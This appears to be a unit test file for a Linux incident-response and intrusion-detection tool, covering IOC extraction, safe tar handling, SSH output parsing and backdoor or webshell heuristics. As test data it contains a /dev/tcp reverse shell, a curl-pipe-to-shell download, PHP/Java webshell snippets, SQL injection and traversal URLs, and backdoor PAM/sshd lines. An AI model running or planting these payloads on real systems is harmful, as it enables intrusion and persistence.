import tarfile
import tempfile
import unittest
from unittest import mock

from core import functions
from core import server


class NormalizeToolResultTests(unittest.TestCase):
    def test_explicit_failure_with_empty_result_stays_failed(self):
        result = functions.normalize_tool_result('demo', {'status': False, 'result': ''})

        self.assertFalse(result['status'])
        self.assertTrue(result['error'])

    def test_failure_text_marks_unnormalized_result_failed(self):
        result = functions.normalize_tool_result('demo', '错误：命令超时')

        self.assertFalse(result['status'])
        self.assertTrue(result['error'])

    def test_empty_output_is_reported_as_empty_not_failure(self):
        result = functions.normalize_tool_result('demo', '')

        self.assertTrue(result['status'])
        self.assertTrue(result['meta']['empty'])
        self.assertEqual(result['meta']['risk'], '未发现明显异常')

    def test_explicit_success_wins_over_risk_keywords(self):
        result = functions.normalize_tool_result('demo', {'status': True, 'result': '可疑但已确认是业务进程'})

        self.assertTrue(result['status'])


class IocTests(unittest.TestCase):
    def test_extracts_expected_ioc_types(self):
        text = (
            'user: root ip: 192.168.1.5 url: http://evil.example.com/a.php '
            f'port: 8080 md5: {"a" * 32}'
        )
        iocs = functions.extract_ioc_values(text)

        self.assertIn('192.168.1.5', iocs['ips'])
        self.assertIn('evil.example.com', iocs['domains'])
        self.assertIn('http://evil.example.com/a.php', iocs['urls'])
        self.assertIn('8080', iocs['ports'])
        self.assertIn('root', iocs['users'])
        self.assertIn('a' * 32, iocs['hashes'])

    def test_filename_like_domains_are_filtered(self):
        iocs = functions.extract_ioc_values('file.tar.gz and app.min.js')

        self.assertNotIn('file.tar.gz', iocs['domains'])
        self.assertNotIn('app.min.js', iocs['domains'])

    def test_loopback_ip_is_filtered(self):
        iocs = functions.extract_ioc_values('listen 127.0.0.1:22 and 10.0.0.8:22')

        self.assertNotIn('127.0.0.1', iocs['ips'])
        self.assertIn('10.0.0.8', iocs['ips'])


class TimelineTests(unittest.TestCase):
    def test_extracts_timestamped_events_and_section_source(self):
        text = '## auth.log\n2026-10-19 10:00:01 Failed password for root\n'
        events = functions.extract_timeline_events(text)

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0]['time'], '2026-10-19 10:00:01')
        self.assertEqual(events[0]['source'], 'auth.log')
        self.assertIn('Failed password', events[0]['event'])

    def test_limit_is_enforced(self):
        text = '\n'.join(f'2026-10-19 10:00:{index:02d} event {index}' for index in range(10))
        events = functions.extract_timeline_events(text, limit=3)

        self.assertEqual(len(events), 3)


class TarSafetyTests(unittest.TestCase):
    def _member(self, name, member_type=tarfile.REGTYPE, size=1, linkname=''):
        info = tarfile.TarInfo(name)
        info.type = member_type
        info.size = size
        info.linkname = linkname
        return info

    def test_normal_member_is_allowed(self):
        with tempfile.TemporaryDirectory() as tmp:
            self.assertTrue(functions.is_safe_tar_member(tmp, self._member('web/index.php')))

    def test_parent_traversal_is_blocked(self):
        with tempfile.TemporaryDirectory() as tmp:
            self.assertFalse(functions.is_safe_tar_member(tmp, self._member('../evil')))
            self.assertFalse(functions.is_safe_tar_member(tmp, self._member('..\\evil')))

    def test_absolute_path_is_blocked(self):
        with tempfile.TemporaryDirectory() as tmp:
            self.assertFalse(functions.is_safe_tar_member(tmp, self._member('/etc/passwd')))

    def test_links_devices_and_fifos_are_blocked(self):
        with tempfile.TemporaryDirectory() as tmp:
            self.assertFalse(functions.is_safe_tar_member(
                tmp, self._member('link', tarfile.SYMTYPE, linkname='/etc/passwd')))
            self.assertFalse(functions.is_safe_tar_member(tmp, self._member('fifo', tarfile.FIFOTYPE)))
            self.assertFalse(functions.is_safe_tar_member(tmp, self._member('null', tarfile.CHRTYPE)))

    def test_oversized_member_is_blocked(self):
        with tempfile.TemporaryDirectory() as tmp:
            self.assertFalse(functions.is_safe_tar_member(
                tmp, self._member('big.bin', size=20 * 1024 * 1024 + 1)))


class FakeChannel:
    def __init__(self, stdout_chunks, stderr_chunks=(), exit_status=0):
        self.stdout_chunks = list(stdout_chunks)
        self.stderr_chunks = list(stderr_chunks)
        self.exit_status = exit_status
        self.closed = False

    def settimeout(self, _timeout):
        pass

    def exec_command(self, _command):
        pass

    def recv_ready(self):
        return bool(self.stdout_chunks)

    def recv(self, _size):
        return self.stdout_chunks.pop(0)

    def recv_stderr_ready(self):
        return bool(self.stderr_chunks)

    def recv_stderr(self, _size):
        return self.stderr_chunks.pop(0)

    def exit_status_ready(self):
        return not self.stdout_chunks and not self.stderr_chunks

    def recv_exit_status(self):
        return self.exit_status

    def close(self):
        self.closed = True


class FakeTransport:
    def __init__(self, channel):
        self.channel = channel

    def open_session(self):
        return self.channel

    def is_active(self):
        return True


class FakeClient:
    def __init__(self, channel):
        self.channel = channel

    def get_transport(self):
        return FakeTransport(self.channel)


class ExecCommandTests(unittest.TestCase):
    def test_drains_all_buffered_chunks_and_closes_channel(self):
        channel = FakeChannel([b'hello ', b'world'])
        result = functions.exec_command(FakeClient(channel), 'demo')

        self.assertEqual(result['stdout'], 'hello world')
        self.assertTrue(result['status'])
        self.assertTrue(channel.closed)

    def test_stderr_is_captured(self):
        channel = FakeChannel([], [b'permission denied'], exit_status=1)
        result = functions.exec_command(FakeClient(channel), 'demo')

        self.assertFalse(result['status'])
        self.assertEqual(result['stderr'], 'permission denied')
        self.assertEqual(result['result'], 'permission denied')

    def test_output_truncation_is_reported(self):
        channel = FakeChannel([b'a' * 5000, b'b' * 5000])
        result = functions.exec_command(FakeClient(channel), 'demo', max_bytes=1024)

        self.assertTrue(result['truncated'])
        self.assertIn('[TRUNCATED]', result['stdout'])


class SocketParsingTests(unittest.TestCase):
    def test_ss_listen_line(self):
        line = 'tcp   LISTEN 0      128    0.0.0.0:22     0.0.0.0:*    users:(("sshd",pid=100,fd=3))'
        socket = server.parse_socket_line(line)

        self.assertEqual(socket['proto'], 'tcp')
        self.assertEqual(socket['state'], 'LISTEN')
        self.assertEqual(socket['local'], '0.0.0.0:22')
        self.assertEqual(socket['remote'], '0.0.0.0:*')

    def test_netstat_listen_line(self):
        line = 'tcp        0      0 0.0.0.0:22      0.0.0.0:*      LISTEN      100/sshd'
        socket = server.parse_socket_line(line)

        self.assertEqual(socket['state'], 'LISTEN')
        self.assertEqual(socket['local'], '0.0.0.0:22')
        self.assertEqual(socket['remote'], '0.0.0.0:*')


class ReportTests(unittest.TestCase):
    def test_risk_alias_normalization(self):
        self.assertEqual(server.normalize_report_risk('high'), '高')
        self.assertEqual(server.normalize_report_risk('medium'), '中')
        self.assertEqual(server.normalize_report_risk('unknown'), '信息')

    def test_inline_report_contains_structured_sections(self):
        report = server.generate_report(
            case={'title': '测试案件', 'target': '192.0.2.10'},
            findings=[{'item': 'SSH 登录', 'finding': '发现异常登录', 'risk': '高', 'evidence': ['auth.log']}],
            timeline=[{'time': '2026-10-19 10:00:01', 'event': '登录成功', 'source': 'auth.log'}],
            iocs={'ips': ['198.51.100.5']},
            answers={'1': '存在异常登录'},
            output_mode='inline',
        )

        self.assertIn('## 案件背景', report)
        self.assertIn('测试案件', report)
        self.assertIn('| SSH 登录 | 发现异常登录 | 高 | auth.log |', report)
        self.assertIn('198.51.100.5', report)
        self.assertIn('存在异常登录', report)

    def test_findings_from_json_string_are_normalized(self):
        findings = server.normalize_findings(
            '[{"item": "Cron", "finding": "发现下载执行", "risk": "high", "evidence": ["/etc/cron.d/x"]}]'
        )

        self.assertEqual(findings[0]['risk'], '高')
        self.assertEqual(findings[0]['item'], 'Cron')
        self.assertEqual(findings[0]['evidence'], ['/etc/cron.d/x'])


class MaliciousPatternTests(unittest.TestCase):
    def test_local_pattern_matches_reverse_shell(self):
        self.assertTrue(functions.check_safe_local('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'))

    def test_benign_text_does_not_match(self):
        self.assertEqual(functions.check_safe_local('hello world'), '')


class RemoteErrorTests(unittest.TestCase):
    def test_permission_errors_are_classified(self):
        self.assertEqual(
            functions.classify_remote_error_text('cat: /etc/shadow: Permission denied'),
            'permission_denied',
        )
        self.assertEqual(
            functions.classify_remote_error_text('bash: /root/x: 权限不足'),
            'permission_denied',
        )

    def test_missing_files_are_not_treated_as_permission_errors(self):
        self.assertEqual(
            functions.classify_remote_error_text('cat: /etc/nope: No such file or directory'),
            'not_found',
        )
        self.assertEqual(
            functions.classify_remote_error_text('cat: /etc/nope: 不存在'),
            'not_found',
        )

    def test_command_not_found_is_an_error_not_missing_file(self):
        self.assertEqual(
            functions.classify_remote_error_text('bash: ss: command not found'),
            'error',
        )

    def test_failed_result_text_becomes_explicit_permission_issue(self):
        result = {'status': False, 'result': 'cat: /etc/shadow: Permission denied', 'stderr': ''}
        issue = functions.remote_result_issue(result, '/etc/shadow')

        self.assertIn('[PERMISSION]', issue)

    def test_missing_result_is_silent_unless_requested(self):
        result = {'status': False, 'result': 'cat: /etc/nope: No such file or directory'}

        self.assertEqual(functions.remote_result_issue(result, '/etc/nope'), '')
        self.assertIn('[NOT_FOUND]', functions.remote_result_issue(result, '/etc/nope', include_missing=True))


class BatchFileParsingTests(unittest.TestCase):
    def test_parses_multiple_files_and_exit_codes(self):
        output = (
            '@@AUTOIR_FILE:/etc/a\n'
            'alpha\n'
            '@@AUTOIR_STATUS:0\n'
            '@@AUTOIR_FILE:/etc/b\n'
            'cat: /etc/b: Permission denied\n'
            '@@AUTOIR_STATUS:1\n'
        )
        entries = server.parse_batched_file_output(output)

        self.assertEqual([entry['path'] for entry in entries], ['/etc/a', '/etc/b'])
        self.assertEqual(entries[0]['content'].strip(), 'alpha')
        self.assertEqual(entries[1]['code'], 1)
        self.assertIn('Permission denied', entries[1]['content'])

    def test_keeps_unterminated_trailing_entry_with_failure_code(self):
        entries = server.parse_batched_file_output('@@AUTOIR_FILE:/etc/a\npartial')

        self.assertEqual(entries[0]['code'], 1)

    def test_nonce_prefix_is_stripped(self):
        output = (
            '@@AUTOIR_FILE:run-123:/etc/a\n'
            'alpha\n'
            '@@AUTOIR_STATUS:run-123:0\n'
        )
        entries = server.parse_batched_file_output(output)

        self.assertEqual(entries[0]['path'], '/etc/a')
        self.assertEqual(entries[0]['code'], 0)

    def test_empty_output_returns_no_entries(self):
        self.assertEqual(server.parse_batched_file_output(''), [])


class RunIdTests(unittest.TestCase):
    def test_run_ids_are_unique_and_time_sortable(self):
        first = functions.get_run_id()
        second = functions.get_run_id()

        self.assertNotEqual(first, second)
        self.assertRegex(first, r'^\d{4}_\d{2}_\d{2}_\d{2}_\d{2}_\d{2}_\d{6}_[0-9a-f]{8}$')


class SafeLineResultTests(unittest.TestCase):
    def setUp(self):
        functions._safeline_cache.clear()
        functions._safeline_request_times.clear()
        patcher = mock.patch.object(functions, 'get_safeline_server', return_value='http://safeline.test/')
        patcher.start()
        self.addCleanup(patcher.stop)
        self.addCleanup(functions._safeline_cache.clear)
        self.addCleanup(functions._safeline_request_times.clear)

    def _response(self, status_code):
        response = mock.Mock()
        response.status_code = status_code
        return response

    def test_403_is_a_hit(self):
        with mock.patch.object(functions._safeline_session, 'get', return_value=self._response(403)) as get:
            result = functions.check_safe_safeline_result('bash -i >& /dev/tcp/1.2.3.4/4444')

        self.assertEqual(result['status'], 'hit')
        self.assertEqual(result['content'], 'bash -i >& /dev/tcp/1.2.3.4/4444')
        get.assert_called_once()

    def test_2xx_is_clean(self):
        with mock.patch.object(functions._safeline_session, 'get', return_value=self._response(200)):
            result = functions.check_safe_safeline_result('normal content', use_cache=False)

        self.assertEqual(result['status'], 'clean')
        self.assertEqual(result['content'], '')

    def test_5xx_is_unavailable_not_clean(self):
        with mock.patch.object(functions._safeline_session, 'get', return_value=self._response(500)):
            result = functions.check_safe_safeline_result('normal content', use_cache=False)

        self.assertEqual(result['status'], 'unavailable')
        self.assertIn('HTTP 500', result['error'])

    def test_request_exception_is_unavailable(self):
        error = functions.requests.RequestException('connection refused')
        with mock.patch.object(functions._safeline_session, 'get', side_effect=error):
            result = functions.check_safe_safeline_result('normal content', use_cache=False)

        self.assertEqual(result['status'], 'unavailable')
        self.assertIn('connection refused', result['error'])

    def test_verdicts_are_cached(self):
        with mock.patch.object(
            functions._safeline_session, 'get', return_value=self._response(403)
        ) as get:
            first = functions.check_safe_safeline_result('cached content')
            second = functions.check_safe_safeline_result('cached content')

        self.assertEqual(first['status'], 'hit')
        self.assertEqual(second['status'], 'hit')
        self.assertEqual(get.call_count, 1)

    def test_rate_limit_reports_unavailable(self):
        now = functions.time.monotonic()
        functions._safeline_request_times.extend([now] * functions.SAFELINE_MAX_QUERIES_PER_MINUTE)

        result = functions.check_safe_safeline_result('rate limited content', use_cache=False)

        self.assertEqual(result['status'], 'unavailable')
        self.assertIn('频率', result['error'])


class PermissionPropagationTests(unittest.TestCase):
    def tearDown(self):
        server.ssh_session.client = None

    def test_ld_so_preload_permission_error_is_not_reported_as_clean(self):
        channel = FakeChannel([], [b'cat: /etc/ld.so.preload: Permission denied'], exit_status=1)
        server.ssh_session.client = FakeClient(channel)

        output = server.check_ld_so_preload()

        self.assertIn('[PERMISSION]', output)
        self.assertNotIn('未发现明显异常', output)

    def test_missing_ld_so_preload_is_still_clean(self):
        channel = FakeChannel([], [b'cat: /etc/ld.so.preload: No such file or directory'], exit_status=1)
        server.ssh_session.client = FakeClient(channel)

        output = server.check_ld_so_preload()

        self.assertNotIn('[PERMISSION]', output)
        self.assertNotIn('[FAILED]', output)

    def test_auth_log_partial_read_keeps_events_and_warns(self):
        channel = FakeChannel(
            [b'Failed password for root from 203.0.113.5 port 22 ssh2'],
            [b"tail: cannot open '/var/log/secure' for reading: No such file or directory"],
            exit_status=1,
        )
        server.ssh_session.client = FakeClient(channel)

        output = server.check_auth_log()

        self.assertIn('203.0.113.5', output)
        self.assertIn('[WARN]', output)

    def test_missing_batch_entries_are_not_silently_dropped(self):
        output = (
            b'@@AUTOIR_FILE:run-1:/etc/a\n'
            b'alpha\n'
            b'@@AUTOIR_STATUS:run-1:0\n'
        )
        channel = FakeChannel([output], exit_status=0)
        server.ssh_session.client = FakeClient(channel)
        warnings = []

        entries = server.read_remote_files(['/etc/a', '/etc/b'], warnings=warnings)

        self.assertEqual([entry['status'] for entry in entries], ['ok', 'error'])
        self.assertTrue(any('[TRUNCATED]' in warning for warning in warnings))


class FindOutputTests(unittest.TestCase):
    def test_find_stderr_marker_is_split(self):
        data, errors = server.split_find_output(
            'file one\nfile two\n@@AUTOIR_FIND_STDERR@@\nfind: /x: Permission denied\n'
        )

        self.assertEqual(data, 'file one\nfile two')
        self.assertIn('Permission denied', errors)

    def test_missing_marker_keeps_plain_output(self):
        data, errors = server.split_find_output('file one\n')

        self.assertEqual(data, 'file one')
        self.assertEqual(errors, '')

    def test_printf_fallback_is_recognized(self):
        self.assertTrue(server.find_printf_fallback_error('find: unrecognized: -printf'))
        self.assertFalse(server.find_printf_fallback_error('find: Permission denied'))


class RealWorldSemanticsTests(unittest.TestCase):
    def tearDown(self):
        server.ssh_session.client = None

    def _run(self, tool, stdout=b'', stderr=b'', exit_status=0, **kwargs):
        channel = FakeChannel([stdout], [stderr], exit_status=exit_status)
        server.ssh_session.client = FakeClient(channel)
        return tool(**kwargs)

    def test_allowlisted_suid_is_not_reported_as_backdoor(self):
        output = self._run(
            server.check_setuid,
            b'-rwsr-xr-x root:root /usr/bin/passwd\n',
        )

        self.assertIn('[i]', output)
        self.assertNotIn('SUID 后门', output)

    def test_unusual_suid_requires_manual_review(self):
        output = self._run(
            server.check_setuid,
            b'-rwsr-xr-x root:root /opt/unknown-helper\n',
        )

        self.assertIn('[!] 非典型 SUID', output)

    def test_suid_owned_by_non_root_is_flagged(self):
        output = self._run(
            server.check_setuid,
            b'-rwsr-xr-x daemon:daemon /usr/bin/passwd\n',
        )

        self.assertIn('属主非 root', output)

    def test_tmp_executable_and_regular_file_are_distinguished(self):
        output = self._run(
            server.check_tmp,
            b'/tmp/run.sh\troot:root\t755\t12 bytes\t2026-10-19 10:00\n'
            b'/tmp/readme\troot:root\t644\t12 bytes\t2026-10-19 10:00\n',
        )

        lines = output.splitlines()
        self.assertIn('[!] /tmp 可执行文件', lines[0])
        self.assertIn('[i] /tmp 文件', lines[1])

    def test_deleted_exe_permission_error_is_not_clean(self):
        output = self._run(
            server.check_deleted_exe,
            b'',
            b'ls: cannot access /proc/1/exe: Permission denied\n',
            exit_status=2,
        )

        self.assertIn('[PERMISSION]', output)

    def test_sshd_missing_is_reported_as_not_found(self):
        output = self._run(
            server.check_ssh,
            b"ls: cannot access '/usr/sbin/sshd': No such file or directory\n",
            exit_status=2,
        )

        self.assertIn('[NOT_FOUND]', output)
        self.assertNotIn('已被劫持', output)

    def test_sshd_symlink_requires_review_not_hijack(self):
        output = self._run(
            server.check_ssh,
            b'lrwxrwxrwx 1 root root 4 Oct 19 10:00 /usr/sbin/sshd -> sshd\n',
        )

        self.assertIn('[i]', output)
        self.assertIn('需人工复核', output)
        self.assertNotIn('已被劫持', output)

    def test_printf_fallback_is_reported_without_hiding_permission_error(self):
        output = self._run(
            server.check_recent_files,
            b'/tmp/new.sh\troot:root\t755\t12 bytes\t2026-10-19 10:00\n'
            b'@@AUTOIR_FIND_STDERR@@\nfind: /tmp/locked: Permission denied\n',
            path='/tmp',
        )

        self.assertIn('/tmp/new.sh', output)
        self.assertIn('[PERMISSION]', output)

    def test_missing_recent_files_path_is_not_reported_as_empty(self):
        output = self._run(
            server.check_recent_files,
            b'@@AUTOIR_FIND_STDERR@@\nfind: /srv/missing: No such file or directory\n',
            path='/srv/missing',
        )

        self.assertIn('[NOT_FOUND]', output)
        self.assertNotIn('未发现变更文件', output)


class WebrootRetentionTests(unittest.TestCase):
    def test_stale_webroot_run_is_pruned_only_when_enabled(self):
        with tempfile.TemporaryDirectory() as tmp:
            run = server.Path(tmp) / 'downloads' / '2026_01_01_00_00_00_000000_abcdef12'
            run.mkdir(parents=True)
            old = server.time.time() - 10 * 86400
            server.os.utime(run, (old, old))

            with mock.patch.object(server, 'base_dir', tmp):
                server.prune_stale_webshell_runs(max_age_days=0)
                self.assertTrue(run.exists())
                server.prune_stale_webshell_runs(max_age_days=7)

            self.assertFalse(run.exists())


class IncidentResponseHeuristicTests(unittest.TestCase):
    def test_history_flags_download_and_execute(self):
        reason = server.history_suspicious_reason('curl -fsSL http://evil/a.sh | sh')

        self.assertIn('shell', reason)

    def test_history_flags_history_cleanup_and_reverse_shell(self):
        self.assertIn('历史记录', server.history_suspicious_reason('history -c'))
        self.assertIn('反弹', server.history_suspicious_reason('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'))

    def test_history_allows_ordinary_commands(self):
        self.assertIsNone(server.history_suspicious_reason('systemctl status nginx'))
        self.assertIsNone(server.history_suspicious_reason('grep -r error /var/log/nginx'))

    def test_package_integrity_tags_binary_and_config_differences(self):
        self.assertIn('[!]', server.package_integrity_tag('S.5....T.  /usr/bin/ls', 'rpm'))
        self.assertIn('缺失', server.package_integrity_tag('missing   /usr/bin/curl', 'rpm'))
        self.assertIn('[i]', server.package_integrity_tag('..5....T. c /etc/ssh/sshd_config', 'rpm'))

    def test_check_export_flags_preload_and_suspicious_path(self):
        original_session = server.ssh_session
        server.ssh_session = server.SSHSession()
        try:
            server.check_export('/root/.bashrc', 'export LD_PRELOAD=/tmp/x.so\n'
                                                  'PATH="/usr/local/sbin:/usr/local/bin:/usr/bin"\n'
                                                  'PATH="/usr/bin:/tmp"\n'
                                                  'BASH_ENV=/dev/shm/env\n')
            output = '\n'.join(server.ssh_session.hijack_output)
        finally:
            server.ssh_session = original_session

        self.assertIn('LD_PRELOAD', output)
        self.assertIn('BASH_ENV', output)
        self.assertIn('/tmp', output)
        self.assertEqual(output.count('PATH 包含可疑目录'), 1)

    def test_check_package_integrity_reports_binary_mismatch(self):
        nonce = 'testnonce'
        payload = (
            f'@@AUTOIR_PKG:{nonce}:MGR@@rpm\n'
            'S.5....T.  /usr/bin/ls\n'
            '..5....T. c /etc/ssh/sshd_config\n'
            f'@@AUTOIR_PKG:{nonce}:LINES@@\n2\n'
            f'@@AUTOIR_PKG:{nonce}:ERR@@\n'
            f'@@AUTOIR_PKG:{nonce}:RC@@1\n'
        )
        channel = FakeChannel([payload.encode()], [], exit_status=1)
        server.ssh_session.client = FakeClient(channel)
        try:
            with mock.patch.object(server, 'get_run_id', return_value=nonce):
                output = server.check_package_integrity()
        finally:
            server.ssh_session.client = None

        self.assertIn('[!] 系统可执行文件/库', output)
        self.assertIn('/etc/ssh/sshd_config', output)
        self.assertIn('[i]', output)

    def test_check_package_integrity_without_package_manager_is_explicit(self):
        nonce = 'testnonce'
        payload = (
            f'@@AUTOIR_PKG:{nonce}:MGR@@none\n'
            f'@@AUTOIR_PKG:{nonce}:LINES@@\n0\n'
            f'@@AUTOIR_PKG:{nonce}:ERR@@\nrpm/dpkg not found\n'
            f'@@AUTOIR_PKG:{nonce}:RC@@127\n'
        )
        channel = FakeChannel([payload.encode()], [], exit_status=0)
        server.ssh_session.client = FakeClient(channel)
        try:
            with mock.patch.object(server, 'get_run_id', return_value=nonce):
                output = server.check_package_integrity()
        finally:
            server.ssh_session.client = None

        self.assertIn('未检测到 rpm/dpkg', output)
        self.assertIn('需人工复核', output)

    def test_pam_line_finding_flags_exec_and_nullok(self):
        self.assertIn('[!]', server.pam_line_finding('auth optional pam_exec.so /tmp/x.sh'))
        self.assertIn('[!]', server.pam_line_finding('auth sufficient pam_unix.so nullok'))
        self.assertIn('[!]', server.pam_line_finding('auth include /tmp/pam_backdoor'))
        self.assertIsNone(server.pam_line_finding('auth required pam_unix.so'))
        self.assertIsNone(server.pam_line_finding('# auth optional pam_exec.so /tmp/x.sh'))

    def test_sshd_config_finding_flags_command_hooks(self):
        self.assertIn('AuthorizedKeysCommand', server.sshd_config_finding('AuthorizedKeysCommand /tmp/keys %u'))
        self.assertIn('临时目录', server.sshd_config_finding('AuthorizedKeysFile /tmp/authorized_keys'))
        self.assertIn('ForceCommand', server.sshd_config_finding('ForceCommand /tmp/backdoor'))
        self.assertIn('非标准 SSH 端口', server.sshd_config_finding('Port 2222'))
        self.assertIsNone(server.sshd_config_finding('PermitRootLogin no'))
        self.assertIsNone(server.sshd_config_finding('# AuthorizedKeysCommand /tmp/keys'))

    def test_kernel_taint_and_module_tags(self):
        taint = server.decode_kernel_taint(str((1 << 12) | (1 << 13)))
        self.assertTrue(any('树外' in line for line in taint))
        self.assertTrue(any('未签名' in line for line in taint))
        self.assertIn('[!]', server.kernel_module_tag('diamorphine', '/lib/modules/x.ko', 'Y'))
        self.assertIn('[!]', server.kernel_module_tag('x', '/tmp/x.ko', 'N'))
        self.assertIn('[i]', server.kernel_module_tag('nfs', '/lib/modules/x.ko', 'Y'))

    def test_web_persistence_finding_flags_php_auto_include(self):
        self.assertIn('[!]', server.web_persistence_finding('/var/www/.user.ini', 'auto_prepend_file=/tmp/a.php'))
        self.assertIn('[!]', server.web_persistence_finding('/etc/php.ini', 'allow_url_include = On'))
        self.assertIn('[!]', server.web_persistence_finding(
            '/var/www/.htaccess', 'AddHandler application/x-httpd-php .jpg'
        ))
        self.assertIsNone(server.web_persistence_finding('/var/www/.htaccess', 'RewriteEngine On'))
        self.assertIsNone(server.web_persistence_finding('/etc/php.ini', '; auto_prepend_file=/tmp/a.php'))

    def test_webshell_heuristics_flag_high_signal_code(self):
        self.assertIn('[!]', server.webshell_line_finding("system($_POST['cmd']);"))
        self.assertIn('[!]', server.webshell_line_finding("Runtime.getRuntime().exec(request.getParameter(\"c\"));"))
        self.assertIsNone(server.webshell_line_finding('echo "hello";'))
        self.assertIn('[!]', server.suspicious_web_filename('/var/www/uploads/a.php.jpg'))
        self.assertIn('[!]', server.suspicious_web_filename('/var/www/.index.php'))
        self.assertIsNone(server.suspicious_web_filename('/var/www/index.php'))

    def test_web_attack_reason_aggregation(self):
        self.assertIn('路径穿越', server.web_attack_reason('/index.php?f=../../etc/passwd'))
        self.assertIn('SQL 注入', server.web_attack_reason('/a.php?id=1 union select 1,2'))
        self.assertIn('WebShell', server.web_attack_reason('/upload/shell.php'))
        self.assertIn('扫描器', server.web_attack_reason('/ Mozilla sqlmap/1.7'))
        self.assertIsNone(server.web_attack_reason('/index.html'))

    def test_auth_correlation_flags_bruteforce_success(self):
        correlated = server.brute_force_success_ips(
            {'1.2.3.4': 10, '5.6.7.8': 2}, {'1.2.3.4': 1, '5.6.7.8': 1}
        )
        self.assertEqual(correlated, [('1.2.3.4', 10, 1)])
        users = server.invalid_user_counts(['Invalid user admin from 1.2.3.4', 'Invalid user admin from 1.2.3.5'])
        self.assertEqual(users, [('admin', 2)])

    def test_login_sessions_reports_sshd_shape_anomalies(self):
        nonce = 'sessnonce'
        payload = (
            f'@@AUTOIR_SESS:{nonce}:WHO@@\n'
            'root pts/0 2026-10-19 10:00 (1.2.3.4)\n'
            f'@@AUTOIR_SESS:{nonce}:LAST@@\n'
            'root pts/0 1.2.3.4 Sun Oct 19 10:00:00 2026 still logged in\n'
            f'@@AUTOIR_SESS:{nonce}:PS@@\n'
            '123 1 root Sun Oct 19 10:00:00 2026 sshd: root@pts/0\n'
            '124 123 root Sun Oct 19 10:01:00 2026 sshd: root@notty\n'
            f'@@AUTOIR_SESS:{nonce}:NET@@\n'
            'tcp ESTAB 0 0 10.0.0.1:22 1.2.3.4:5555 users:(("sshd",pid=124,fd=3))\n'
        )
        channel = FakeChannel([payload.encode()], [], exit_status=0)
        server.ssh_session.client = FakeClient(channel)
        try:
            with mock.patch.object(server, 'get_run_id', return_value=nonce):
                output = server.check_login_sessions()
        finally:
            server.ssh_session.client = None

        self.assertIn('父进程为 1', output)
        self.assertIn('notty', output)
        self.assertIn('1.2.3.4:5555', output)


if __name__ == '__main__':
    unittest.main()
